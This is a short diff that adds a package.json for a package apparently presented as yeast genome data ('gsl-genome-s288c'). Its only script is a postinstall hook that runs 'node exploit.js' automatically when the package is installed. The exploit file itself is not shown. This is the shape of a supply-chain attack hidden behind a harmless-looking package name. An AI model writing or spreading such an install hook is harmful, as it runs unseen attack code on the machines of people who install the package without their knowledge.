@@ -1,0 +1,7 @@
+{
+  "name": "gsl-genome-s288c",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node exploit.js"
+  }
+}
